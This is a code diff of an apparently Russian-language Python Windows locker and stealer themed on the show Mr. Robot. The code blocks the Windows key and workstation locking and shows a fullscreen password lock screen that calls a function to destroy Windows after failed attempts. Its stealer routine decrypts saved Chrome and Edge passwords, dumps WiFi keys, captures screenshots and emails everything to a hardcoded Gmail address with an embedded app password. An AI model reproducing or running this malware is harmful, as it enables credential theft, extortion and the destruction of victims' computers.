@@ -17,42 +17,33 @@ GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
 VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
 AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp3"
-LOGO_URL = "https://github.com/ippo123459-bit/winlocker/blob/main/logo.png?raw=true"
+LOGO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/logo.png"
+LOCKER_MUSIC_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc).mp3"
 VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp4")
 AUDIO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp3")
 LOGO_PATH = os.path.join(tempfile.gettempdir(), "logo.png")
+LOCKER_MUSIC_PATH = os.path.join(tempfile.gettempdir(), "locker_music.mp3")
 attempts_left = MAX_ATTEMPTS
 
-# ===== ОТКЛЮЧЕНИЕ WIN (ВКЛЮЧАЯ Win+L) =====
+# ===== ОТКЛЮЧЕНИЕ WIN =====
 def disable_win_key():
-    # Реестр
     try:
         for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
             try:
                 k = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1)
-                winreg.CloseKey(k)
+                winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k)
             except: pass
             try:
                 k2 = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(k2, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1)
-                winreg.CloseKey(k2)
+                winreg.SetValueEx(k2, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k2)
             except: pass
     except: pass
-    # Keyboard
     try:
         import keyboard
-        keyboard.block_key('windows')
-        keyboard.block_key('left windows')
-        keyboard.block_key('right windows')
+        keyboard.block_key('windows'); keyboard.block_key('left windows'); keyboard.block_key('right windows')
         for c in ['win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i','win+a','win+s','win+p','win+t','win+ctrl+d','win+ctrl+f4','win+shift+m','left windows','right windows','left windows+l','right windows+l']:
             try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
             except: pass
-        # Отдельно Win+L
-        try: keyboard.add_hotkey('win+l', lambda: None, suppress=True)
-        except: pass
-        try: keyboard.remap_key('windows+l', None)
-        except: pass
     except: pass
 
 def enable_win_key():
@@ -176,8 +167,7 @@ def download_file(url, path):
 def anim_fsociety():
     a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
     a.configure(bg='black'); a.overrideredirect(True)
-    lbl = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 50, 'bold'))
-    lbl.pack(expand=True)
+    lbl = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 50, 'bold')); lbl.pack(expand=True)
     for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
         lbl.config(text=t); a.update(); time.sleep(0.3)
     time.sleep(1)
@@ -248,43 +238,24 @@ def mega_steal():
     except: pass
     try: report.append("\nNETWORK:\n" + subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866','replace')[:2000])
     except: pass
-    # Chrome
-    chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
-    if os.path.exists(chrome_path):
-        report.append("\n=== CHROME PASSWORDS ===")
-        try:
-            db = os.path.join(tempfile.gettempdir(), 'chrome.db')
-            shutil.copy2(chrome_path, db)
-            cur = sqlite3.connect(db).cursor()
-            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
-            for url, user, pw in cur:
-                try:
-                    pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
-                    report.append(f"URL: {url}\nLOGIN: {user}\nPASS: {pwd}")
+    for browser, path in [("CHROME", os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')),
+                          ("EDGE", os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'))]:
+        if os.path.exists(path):
+            report.append(f"\n=== {browser} ===")
+            try:
+                db = os.path.join(tempfile.gettempdir(), f'{browser}.db')
+                shutil.copy2(path, db)
+                cur = sqlite3.connect(db).cursor()
+                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+                for url, user, pw in cur:
+                    try:
+                        pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
+                        report.append(f"URL: {url}\nLOGIN: {user}\nPASS: {pwd}")
+                    except: pass
+                cur.close()
+                try: os.remove(db)
                 except: pass
-            cur.close()
-            try: os.remove(db)
             except: pass
-        except: pass
-    # Edge
-    edge_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
-    if os.path.exists(edge_path):
-        report.append("\n=== EDGE PASSWORDS ===")
-        try:
-            db = os.path.join(tempfile.gettempdir(), 'edge.db')
-            shutil.copy2(edge_path, db)
-            cur = sqlite3.connect(db).cursor()
-            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
-            for url, user, pw in cur:
-                try:
-                    pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
-                    report.append(f"URL: {url}\nLOGIN: {user}\nPASS: {pwd}")
-                except: pass
-            cur.close()
-            try: os.remove(db)
-            except: pass
-        except: pass
-    # WiFi
     try:
         report.append("\n=== WIFI ===")
         output = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866','replace')
@@ -296,13 +267,6 @@ def mega_steal():
                     for dl in det.split('\n'):
                         if 'Содержимое ключа' in dl: report.append(f"WiFi: {p} | PASS: {dl.split(':')[1].strip()}")
     except: pass
-    # Cookies
-    try:
-        cookies_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
-        if os.path.exists(cookies_path):
-            report.append(f"\n=== COOKIES ===\nChrome cookies: {os.path.getsize(cookies_path)} bytes")
-    except: pass
-    # Скриншот
     try:
         ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
         ImageGrab.grab().save(ss, 'JPEG', quality=50)
@@ -310,7 +274,6 @@ def mega_steal():
         try: os.remove(ss)
         except: pass
     except: pass
-    
     report.append(f"\nTIME: {time.strftime('%d.%m.%Y %H:%M:%S')}")
     text = '\n'.join(report)
     for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]): send_email(part, f"[DedSek_Logs] [{i+1}]")
@@ -346,11 +309,11 @@ class WinLocker:
         self.win.protocol("WM_DELETE_WINDOW", lambda: None); self.win.focus_force()
         global attempts_left
         
-        # ЛОГОТИП В ЛЕВОМ УГЛУ
+        # ЛОГОТИП
         download_file(LOGO_URL, LOGO_PATH)
         try:
             logo = PhotoImage(file=LOGO_PATH)
-            logo = logo.subsample(3, 3)  # Уменьшаем в 3 раза
+            logo = logo.subsample(4, 4)
             lbl_logo = tk.Label(self.win, image=logo, bg='black')
             lbl_logo.image = logo
             lbl_logo.place(x=10, y=10)
@@ -361,6 +324,15 @@ class WinLocker:
         self.timer_label = tk.Label(self.win, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
         self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
         self.update_timer()
+        
+        # МУЗЫКА В ФОНЕ
+        download_file(LOCKER_MUSIC_URL, LOCKER_MUSIC_PATH)
+        try:
+            import pygame
+            pygame.mixer.init()
+            pygame.mixer.music.load(LOCKER_MUSIC_PATH)
+            pygame.mixer.music.play(-1)
+        except: pass
         
         msg = f"""Привет друг!
 
@@ -407,6 +379,8 @@ YOU FUCK.
     def check(self, e=None):
         global attempts_left
         if self.pw.get() == PASSWORD:
+            try: pygame.mixer.music.stop()
+            except: pass
             unblock_all()
             self.sl.config(text="ВЕРНО!", fg='white'); self.win.update()
             try: os.remove(TIMER_FILE)
@@ -416,6 +390,8 @@ YOU FUCK.
             attempts_left -= 1
             if attempts_left > 0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
             else:
+                try: pygame.mixer.music.stop()
+                except: pass
                 self.sl.config(text="404 | ОШИБКА", fg='white'); self.win.update()
                 time.sleep(2); destroy_windows_forever()
             self.pw.delete(0, tk.END)
